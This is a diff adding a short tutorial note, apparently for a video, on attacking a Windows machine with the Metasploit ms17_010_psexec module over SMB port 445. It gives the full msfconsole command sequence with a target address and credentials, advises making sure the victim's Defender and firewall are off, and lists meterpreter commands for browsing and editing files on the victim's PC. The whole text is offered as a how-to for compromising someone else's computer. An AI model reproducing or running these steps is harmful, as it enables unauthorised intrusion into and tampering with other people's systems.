@@ -1,0 +1,27 @@
+
+Exploit :-
+       exploit/windows/smb/ms17_010_psexec
+
+note:- check that windows port 445 is open or not..  (you can use xerosploit for it)
+       if not then first open this port on windows.
+
+note:- for get meterpreter session confirm that windows defender and firewall shoud be off of victom's pc.
+
+# msfconsole
+# use exploit/windows/smb/ms17_010_psexec
+# set RHOST 192.168.43.34
+# set SMBUser Shadowx
+# set SMBPass hexx@143
+# exploit
+
+if you got meterpreter session then type :-
+
+# help
+# pwd (for check victom's pc directory)
+# dir (for check files present in directory)
+# edit a.cpp (here you can type edit filename.formate_type)
+
+file is open now you can edit.
+Thank for watching this video....
+
+ 
